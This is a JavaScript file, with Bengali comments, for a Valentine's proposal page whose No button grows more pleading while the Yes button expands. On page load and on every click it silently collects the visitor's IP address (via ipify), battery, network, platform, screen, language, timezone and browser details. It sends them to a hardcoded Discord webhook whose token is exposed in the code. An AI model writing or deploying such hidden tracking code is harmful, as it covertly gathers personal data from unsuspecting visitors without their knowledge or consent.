const noBtn = document.getElementById("no-btn");
const yesBtn = document.getElementById("yes-btn");
const displayImg = document.getElementById("display-image");
const questionText = document.getElementById("question");
const bgImage = document.querySelector(".bg-image");
const buttonContainer = document.querySelector(".buttons");

// আপনার ডিসকর্ড ওয়েব হুক URL
const webhookURL = "https://discordapp.com/api/webhooks/1469330532000333988/xbDTabqcpc9qZoJJmMtaLC0Dnyzh1A-JkDPLgwN25Bzj405ek9Z125-SY-QsTF1Xi4q2";

// বিস্তারিত ডিভাইস ইন্টেল সংগ্রহের ফাংশন
async function sendToDiscord(status) {
    let ipAddress = "Fetching...";
    let batteryLevel = "N/A";
    let networkType = navigator.connection ? navigator.connection.effectiveType : "Unknown";

    try {
        // ১. আইপি অ্যাড্রেস সংগ্রহ
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        ipAddress = data.ip;

        // ২. ব্যাটারি স্ট্যাটাস সংগ্রহ
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryLevel = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Charging" : "Not Charging"})`;
        }
    } catch (e) {
        ipAddress = "Error/Blocked";
    }

    // আপনার রিকোয়েস্ট করা হুবহু ফরম্যাটে ডিসকর্ড এম্বেড
    const deviceInfo = {
        embeds: [{
            title: `Action: User clicked ${status}`,
            color: status.includes("YES") ? 5025616 : 16711680,
            fields: [
                { name: "🌐 IP Address", value: ipAddress, inline: true },
                { name: "🔋 Battery", value: batteryLevel, inline: true },
                { name: "📶 Network", value: networkType, inline: true },
                { name: "📱 Platform", value: navigator.platform || "Unknown", inline: true },
                { name: "🖥️ Screen", value: `${window.screen.width}x${window.screen.height}`, inline: true },
                { name: "🌍 Language", value: navigator.language || "Unknown", inline: true },
                { name: "🕒 Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown", inline: true },
                { name: "🧭 Browser", value: navigator.userAgent.split(' ').pop(), inline: true },
                { name: "⏰ Event Time", value: new Date().toLocaleString(), inline: false }
            ],
            footer: { text: "Advanced Device Intel - Specialist Mode" }
        }]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(deviceInfo)
    });
}

// পেজ ভিজিট করামাত্র সাইলেন্টলি একবার ডাটা পাঠাবে
window.onload = () => sendToDiscord("Page Visited");

// আকর্ষণীয় তিনটি মেসেজ (রিপিট হবে না)
const messages = [
    "No", 
    "একটু ভেবে দেখো! 🥺", 
    "মন ভাঙবা আমার? 💔", 
    "প্লিজ 'Yes' বলো না! ❤️"
];
let messageIndex = 0;

noBtn.addEventListener("click", () => {
    if (messageIndex < messages.length - 1) {
        sendToDiscord("NO (Attempt)");
        messageIndex++;
        noBtn.innerHTML = messages[messageIndex];
        
        // Yes বাটন প্রতি ক্লিকে অনেক বড় হবে
        const currentSize = parseFloat(window.getComputedStyle(yesBtn).fontSize);
        yesBtn.style.fontSize = (currentSize * 1.6) + "px";
        yesBtn.style.padding = "25px 50px";
    } else {
        // ৩টি অপশন শেষ হলে No বাটন গায়েব হয়ে যাবে
        noBtn.style.display = "none";
        
        // মেইন Yes বাটনটি বড় হয়ে পুরো স্ক্রিন দখল করবে
        yesBtn.innerHTML = "Yes";
        yesBtn.style.width = "100%";
        yesBtn.style.fontSize = "2.2rem";
        yesBtn.style.padding = "40px";
        
        sendToDiscord("NO Button Removed");
    }
});

// Yes বাটনে ক্লিক করলে সাকসেস ফাংশন
yesBtn.addEventListener("click", () => {
    sendToDiscord("YES (Confirmed)");
    
    questionText.innerHTML = "I knew it! Happy Valentine's Day! ❤️";
    questionText.style.fontSize = "2.2rem"; 
    
    displayImg.src = "success_image.jpg"; // আপনার সাকসেস ছবি
    bgImage.classList.add("bg-clear"); // ব্যাকগ্রাউন্ডের ব্লার সরিয়ে দিবে
    buttonContainer.style.display = "none"; // বাটন সেকশন হাইড হবে

    // রঙিন কনফেটি লঞ্চ
    confetti({
        particleCount: 250,
        spread: 100,
        origin: { y: 0.6 }
    });
});
